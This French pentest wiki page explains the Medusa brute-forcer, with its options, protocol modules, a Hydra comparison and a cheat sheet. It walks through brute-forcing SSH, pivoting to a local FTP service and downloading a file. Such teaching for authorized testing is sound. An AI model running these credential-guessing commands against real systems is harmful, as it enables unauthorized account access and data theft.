# Medusa

## Pourquoi

Medusa est un brute-forcer reseau concu pour etre massivement parallele et modulaire. Si Hydra est le couteau suisse du brute force, Medusa est son equivalent oriente performance. Il supporte un large eventail de protocoles et se distingue par sa stabilite sur les attaques a fort volume.

## Comment ca marche

Medusa fonctionne sur le meme principe qu'Hydra : il ouvre des connexions paralleles vers le service cible et teste systematiquement les combinaisons de credentials. Chaque protocole est gere par un module dedie. La difference principale avec Hydra reside dans la gestion des threads et la stabilite sur les sessions longues.

## En pratique

### Installation

Preinstalle sur Kali, Parrot et Exegol. Pour verifier :

```bash
medusa -h
```

Si absent :

```bash
sudo apt-get update && sudo apt-get install -y medusa
```

### Syntaxe generale

```bash
medusa [options_cible] [options_credentials] -M module [options_module]
```

### Options principales

| Option | Description | Exemple |
|---|---|---|
| `-h HOST` | Cible unique | `medusa -h 10.10.10.5 ...` |
| `-H FILE` | Fichier de cibles | `medusa -H targets.txt ...` |
| `-u USER` | Un seul login | `medusa -u admin ...` |
| `-U FILE` | Fichier de logins | `medusa -U users.txt ...` |
| `-p PASS` | Un seul mot de passe | `medusa -p secret ...` |
| `-P FILE` | Fichier de mots de passe | `medusa -P pass.txt ...` |
| `-M MODULE` | Module a utiliser | `medusa -M ssh ...` |
| `-m "OPT"` | Options du module | `medusa -m "POST /login ..."` |
| `-t TASKS` | Threads paralleles | `medusa -t 5 ...` |
| `-f` / `-F` | Stopper au 1er succes (host / global) | `medusa -f ...` |
| `-n PORT` | Port non standard | `medusa -n 2222 ...` |
| `-e ns` | Tester vide (n) et user=pass (s) | `medusa -e ns ...` |

### Modules courants

| Module | Protocole | Exemple |
|---|---|---|
| `ssh` | SSH | `medusa -M ssh -h <IP> -u root -P pass.txt` |
| `ftp` | FTP | `medusa -M ftp -h <IP> -u admin -P pass.txt` |
| `http` | HTTP (GET/POST) | `medusa -M http -h <IP> -m DIR:/login -m FORM:user=^USER^&pass=^PASS^` |
| `mysql` | MySQL | `medusa -M mysql -h <IP> -u root -P pass.txt` |
| `rdp` | Remote Desktop | `medusa -M rdp -h <IP> -u admin -P pass.txt` |
| `telnet` | Telnet | `medusa -M telnet -h <IP> -u admin -P pass.txt` |
| `vnc` | VNC | `medusa -M vnc -h <IP> -P pass.txt` |
| `pop3` | POP3 | `medusa -M pop3 -h <IP> -U users.txt -P pass.txt` |
| `imap` | IMAP | `medusa -M imap -h <IP> -U users.txt -P pass.txt` |
| `svn` | Subversion | `medusa -M svn -h <IP> -u admin -P pass.txt` |
| `web-form` | Formulaires web | `medusa -M web-form -h <IP> -m FORM:"user=^USER^&pass=^PASS^:F=Invalid"` |

### Brute force SSH

```bash
medusa -h <IP_CIBLE> -n <PORT> -u sshuser -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt -M ssh -t 3
```

Le resultat en cas de succes :

```
ACCOUNT FOUND: [ssh] Host: <IP_CIBLE> User: sshuser Password: <mot_de_passe> [SUCCESS]
```

{% hint style="warning" %}
Pour SSH, limiter les threads a 3-5 (`-t 3`). Les serveurs SSH limitent les connexions simultanees et des threads trop nombreux provoquent des echecs de connexion.
{% endhint %}

### Scenario de pivot : SSH puis FTP local

Un scenario realiste : on brute-force un service SSH expose, puis une fois connecte, on decouvre un service FTP accessible uniquement en local.

**Etape 1 : Brute force SSH**

```bash
medusa -h <IP_CIBLE> -n <PORT> -u sshuser \
       -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt \
       -M ssh -f -t 3
```

**Etape 2 : Connexion et reconnaissance**

```bash
ssh sshuser@<IP_CIBLE> -p <PORT>

# Une fois connecte, scanner les ports locaux
netstat -tulpn | grep LISTEN
# ou
nmap localhost
```

Si un service FTP (port 21) est identifie et qu'un dossier `/home/ftpuser` existe :

**Etape 3 : Brute force FTP depuis la session SSH**

```bash
medusa -h 127.0.0.1 -u ftpuser \
       -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt \
       -M ftp -f -t 5
```

{% hint style="info" %}
Utiliser `127.0.0.1` (et non `localhost`) pour forcer la connexion en IPv4. Certains services FTP ne repondent pas en IPv6.
{% endhint %}

**Etape 4 : Recuperation des fichiers**

```bash
ftp ftpuser@localhost
# Entrer le mot de passe trouve
ftp> ls
ftp> get fichier_sensible.txt
ftp> exit
```

### Tester les credentials vides et par defaut

```bash
medusa -h <IP_CIBLE> -U users.txt -e ns -M ssh
```

L'option `-e ns` teste deux cas supplementaires pour chaque utilisateur :
- `n` : mot de passe vide
- `s` : mot de passe identique au nom d'utilisateur

### Cibler plusieurs serveurs HTTP

```bash
medusa -H web_servers.txt -U users.txt -P pass.txt -M http -m GET
```

## Hydra vs Medusa

| Critere | Hydra | Medusa |
|---|---|---|
| Protocoles supportes | ~50 | ~25 |
| Module HTTP | `http-get`, `http-post-form` (integres) | `http`, `web-form` (via `-m`) |
| Threads par defaut | 16 | 1 (augmenter avec `-t`) |
| Stabilite sur SSH | Correcte | Tres bonne |
| Generation de passwords (`-x`) | Oui | Non |
| Arret multiple cibles | `-F` (global) | `-f` (host) / `-F` (global) |
| Popularite | Plus repandu | Moins connu, mais fiable |

{% hint style="success" %}
En pratique, Hydra et Medusa se completent. Hydra est le choix par defaut pour sa polyvalence. Medusa est une bonne alternative quand Hydra a des problemes de stabilite sur un service specifique, ou pour les scenarios avec SSH + pivot.
{% endhint %}

## Pieges et galeres

- Medusa ne supporte pas la generation de mots de passe a la volee (`-x`). Il faut toujours fournir un fichier de mots de passe.
- Le module HTTP de Medusa est moins intuitif que celui d'Hydra. Pour les formulaires web, Hydra est generalement plus pratique.
- L'option `-e ns` est souvent oubliee. Elle permet de trouver des credentials triviales sans meme ouvrir la wordlist.
- Medusa par defaut n'utilise qu'un seul thread. Toujours specifier `-t` pour accelerer l'attaque.
- Sur certains services, Medusa peut etre plus lent qu'Hydra a cause de sa gestion differente des connexions.

## Retour terrain

En engagement, le choix entre Hydra et Medusa depend du contexte. Pour du brute force HTTP (Basic Auth ou formulaires), Hydra est plus direct. Pour un pivot interne ou un brute force SSH intensif, Medusa peut etre plus stable. L'ideal est de maitriser les deux et de basculer si l'un pose probleme.

Le scenario SSH vers FTP local est classique en lab HTB, mais il se retrouve en engagement reel : un serveur expose SSH avec des credentials faibles, et une fois a l'interieur, des services internes mal proteges deviennent accessibles.

## Memo express

| Objectif | Commande |
|---|---|
| SSH | `medusa -h <IP> -u user -P pass.txt -M ssh -t 3` |
| FTP | `medusa -h <IP> -u user -P pass.txt -M ftp -t 5` |
| Credentials vides/defaut | `medusa -h <IP> -U users.txt -e ns -M ssh` |
| Port non standard | Ajouter `-n <PORT>` |
| Stopper au 1er succes | Ajouter `-f` |
| Multiples cibles | `-H targets.txt` au lieu de `-h` |
| Forcer IPv4 | Utiliser `127.0.0.1` au lieu de `localhost` |

***
